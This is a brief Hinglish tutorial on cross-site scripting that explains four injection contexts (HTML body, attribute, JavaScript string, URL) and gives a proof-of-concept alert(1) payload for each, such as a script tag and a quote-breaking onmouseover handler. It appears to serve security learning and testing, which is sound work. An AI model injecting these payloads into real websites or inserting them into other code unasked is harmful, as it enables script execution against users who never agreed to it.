Dekho input kis context me aa raha hai.

Contexts Samajhna Bahut Important Hai
HTML Context

Example:

<p>INPUT_HERE</p>

Payload:

<script>alert(1)</script>
Attribute Context

Example:

<input value="INPUT_HERE">

Payload:

" onmouseover="alert(1)
JavaScript Context

Example:

<script>
var name="INPUT_HERE";
</script>

Payload:

";alert(1);//
URL Context

Example:

<a href="INPUT_HERE">

Payload:

javascript:alert(1)
